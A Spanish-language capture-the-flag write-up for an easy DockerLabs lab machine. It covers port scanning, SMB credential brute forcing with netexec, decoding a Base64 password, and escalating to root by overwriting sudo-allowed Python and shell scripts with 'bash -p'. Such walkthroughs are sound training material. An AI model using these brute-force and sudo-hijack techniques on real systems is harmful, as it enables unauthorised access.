Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #smb #password-reuse #sudo-abuse #python-hijacking #base64

![](assets/Pasted%20image%2020251107000945.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
> ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.315 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.315/0.315/0.315/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> nmap -p- -sS -Pn -n --min-rate 5000 -vvv 172.17.0.2
----------------------------------------------------
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

- Puertos 22, 80, 139 y 445 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> nmap -p 22,80,139,445 -sCV -sS -Pn -n --min-rate 5000 -vvv 172.17.0.2
----------------------------------------------------------------------
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 39:f8:44:51:19:1a:a9:78:c2:21:e6:19:d3:1e:41:96 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFmj291adBscTtJfFsqsJ5+SDL2UY2Tbus+5WLsH88PJy/OUEvfBIU55KCsbwB2DHv+GJoj1LiDHXNtrSHPjVlA=
|   256 43:9b:ac:9c:d3:0c:ad:95:44:3a:c3:fb:9e:df:3e:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPl+8RksbbFRCVnH38jgJ9ahUL7OROoJjSyOBkc4TxyV
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: Juego de Tronos
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
MAC Address: BA:6A:21:B3:CA:59 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH OpenSSH 9.2p1 Debian 2+deb12u3
- Puerto 80 HTTP Apache httpd 2.4.61 (Debian)
- Puertos 139 y 445 SMB Samba smbd 4.6.2

## Enumeración

### Puerto 80 HTTP

La página principal es una landing page temática de Juego de Tronos. En el contenido de la página podemos identificar posibles usuarios del sistema:

- `jon`
- `daenerys`
- `arya`

![](assets/Pasted%20image%2020251106200304.png)

**Fuzzing de Directorios.**

Utilicé `gobuster` para descubrir posibles recursos en el servidor web.

```bash
> gobuster dir -w /home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://172.17.0.2/ -x html,php,js,py,txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1729]
/server-status        (Status: 403) [Size: 275]
/dragon               (Status: 301) [Size: 309] [--> http://172.17.0.2/dragon/]
```

- Encuentro un directorio `/dragon`

Accediendo al directorio `/dragon` encuentro un archivo de texto llamado `EpisodiosT1` que contiene lo que parecen ser posibles contraseñas.

![](assets/Pasted%20image%2020251106200637.png)

Descargo el archivo para utilizarlo como diccionario en posibles ataques de fuerza bruta.

### Servicio SMB

Con `smbmap` procedo a enumerar y listar recursos compartidos del servicio SMB sin autenticación.

```bash
> smbmap -H 172.17.0.2
-------------------------------------------------------------------------------------------------------
[+] IP: 172.17.0.2:445	Name: 172.17.0.2                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	shared                                            	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.17.12-Debian)
	nobody                                            	NO ACCESS	Home Directories
```

- Vemos un recurso compartido llamado `shared` pero no tenemos acceso sin credenciales.

## Explotación

Por ahora tengo 3 posibles usuarios y una lista de posibles contraseñas por lo cual puedo tratar de realizar un ataque de fuerza bruta sobre el servicio **SMB** utilizando `netexec`.

```bash
> nxc smb 172.17.0.2 -u possible_users.txt -p possible_passwords.txt
----------------------------------------------------------------
SMB         172.17.0.2      445    7BDD00394D8E     [+] 7BDD00394D8E\jon:seacercaelinvierno
```

- Encuentro credenciales válidas: `jon:seacercaelinvierno`

Ahora enumero los recursos SMB a los que el usuario `jon` tiene acceso.

```bash
> smbclient -L //172.17.0.2 -U jon
Password for [WORKGROUP\jon]:
-------------------------------------------
      Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	shared          Disk      
	IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
```

- Tengo acceso al recurso `shared`

Me conecto al recurso compartido `shared` para explorar su contenido.

```bash
> smbclient //172.17.0.2/shared -U jon
Password for [WORKGROUP\jon]:
-------------------------------------------------------------------------------
smb: \> ls
  .                                   D        0  Tue Jul 16 14:26:00 2024
  ..                                  D        0  Tue Jul 16 14:25:59 2024
  proteccion_del_reino                N      313  Tue Jul 16 14:26:00 2024

smb: \> get proteccion_del_reino
getting file \proteccion_del_reino of size 313 as proteccion_del_reino (76.4 KiloBytes/sec) (average 76.4 KiloBytes/sec)
```

- Encuentro y descargo un archivo llamado `proteccion_del_reino`

Inspecciono el contenido del archivo descargado.

```bash
> cat proteccion_del_reino
Aria de ti depende que los caminantes blancos no consigan pasar el muro. 
Tienes que llevar a la reina Daenerys el mensaje, solo ella sabra interpretarlo. Se encuentra cifrado en un lenguaje antiguo y dificil de entender. 
Esta es mi contraseña, se encuentra cifrada en ese lenguaje y es -> aGlqb2RlbGFuaXN0ZXI=
```

El archivo contiene una contraseña codificada en Base64. Procedo a decodificarla.

```bash
> echo "aGlqb2RlbGFuaXN0ZXI=" | base64 -d; echo
hijodelanister
```

- Contraseña decodificada: `hijodelanister`

Con esta contraseña y los usuarios identificados anteriormente (`jon`, `daenerys`, `arya`), intento acceder por SSH.

```bash
> ssh jon@172.17.0.2
jon@172.17.0.2's password: hijodelanister
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-76-generic x86_64)

jon@7bdd00394d8e:~$ whoami
jon
```

- Acceso exitoso como el usuario `jon`

## Escalada de Privilegios

Dentro del sistema enumero binarios que pueda ejecutar con privilegios elevados.

```bash
> sudo -l
----------------------------------------------------------
User jon may run the following commands on 7bdd00394d8e:
    (aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py
```

- Puedo ejecutar el script `/home/jon/.mensaje.py` como el usuario `aria` sin contraseña.

El script al parecer simplemente encripta mensajes.

```python
> cat .mensaje.py

import hashlib
import getpass

def encriptar_mensaje():
    mensaje = input('Ingrese el mensaje que desea encriptar: ')

    mensaje_bytes = mensaje.encode('utf-8')

    hash_obj = hashlib.sha256()

    hash_obj.update(mensaje_bytes)

    hash_resultado = hash_obj.hexdigest()

    print(f'Mensaje Original: {mensaje}')
    print(f'Hash SHA-256: {hash_resultado}')

if __name__ == '__main__':
    usuario_actual = getpass.getuser()

    if usuario_actual == 'jon' or usuario_actual == 'aria':
        encriptar_mensaje()
    else:
        print('Lo siento, no tienes permiso para ejecutar este script.')
```

Esta es una oportunidad para realizar un **Python Script Hijacking**. Como tengo permisos de escritura sobre el script, puedo modificar su contenido para ejecutar comandos arbitrarios como el usuario `aria`.

Reemplazo el contenido del script con código que me otorgue una shell.

```bash
> jon@7bdd00394d8e:~$ rm /home/jon/.mensaje.py
> jon@7bdd00394d8e:~$ nano /home/jon/.mensaje.py
----------------------------------------------------
import os

os.system("bash -p")
----------------------------------------------------
```

Ejecuto el script modificado para migrar al usuario `aria`.

```bash
jon@7bdd00394d8e:~$ sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
aria@7bdd00394d8e:/home/jon$ whoami
aria
```

### Migración a daenerys

Vuelvo a enumerar binarios con privilegios elevados, ahora como el usuario `aria`.

```bash
> sudo -l
----------------------------------------------------------
User aria may run the following commands on 7bdd00394d8e:
    (daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls
```

- Puedo ejecutar `cat` y `ls` como el usuario `daenerys` sin contraseña.

Esto me permite leer archivos del directorio home de `daenerys`. Utilizo `ls` para listar el contenido.

```bash
> aria@7bdd00394d8e:/home/jon$ sudo -u daenerys /usr/bin/ls -lsa /home/daenerys
total 16
0 drwx------ 1 daenerys daenerys    0 Jul 16  2024 .
0 drwxr-xr-x 1 root     root        6 Jul 16  2024 ..
4 -rw-r--r-- 1 daenerys daenerys  220 Mar 29  2024 .bash_logout
4 -rw-r--r-- 1 daenerys daenerys 3526 Mar 29  2024 .bashrc
4 -rw-r--r-- 1 daenerys daenerys  807 Mar 29  2024 .profile
0 drwxr-xr-x 1 root     root       18 Jul 16  2024 .secret
4 -rw-rw-r-- 1 daenerys daenerys  277 Jul 16  2024 mensajeParaJon
```

- Encuentro un archivo interesante llamado `mensajeParaJon`

Utilizo `cat` para leer el contenido del archivo.

```bash
> aria@7bdd00394d8e:/home/jon$ sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon
Aria estare encantada de ayudar a Jon con la guerra en el norte, siempre y cuando despues Jon cumpla y me ayude a  recuperar el trono de hierro. 
Te dejo en este mensaje la contraseña de mi usuario por si necesitas llamar a uno de mis dragones desde tu ordenador.

!drakaris!
```

- Encuentro la contraseña de `daenerys`: `!drakaris!`

Migro al usuario `daenerys` utilizando la contraseña encontrada.

```bash
> aria@7bdd00394d8e:/home/jon$ su daenerys
Password: !drakaris!
> daenerys@7bdd00394d8e:/home/jon$ whoami
daenerys
```

### Escalada a root

Enumero nuevamente los privilegios sudo del usuario `daenerys`.

```bash
daenerys@7bdd00394d8e:/home/jon$ sudo -l

User daenerys may run the following commands on 7bdd00394d8e:
    (ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

- Puedo ejecutar el script `/home/daenerys/.secret/.shell.sh` como root sin contraseña.

Como tengo permisos de escritura sobre este script, puedo modificarlo para obtener una shell como root.

Reemplazo el contenido del script.

```bash
daenerys@7bdd00394d8e:~/.secret$ nano .shell.sh
daenerys@7bdd00394d8e:~/.secret$ cat .shell.sh 
#!/bin/bash

bash -p
```

Ejecuto el script y obtengo acceso como root.

```bash
daenerys@7bdd00394d8e:~/.secret$ sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
root@7bdd00394d8e:/home/daenerys/.secret# whoami
root
root@7bdd00394d8e:/home/daenerys/.secret# id
uid=0(root) gid=0(root) groups=0(root)
```

***PWNED***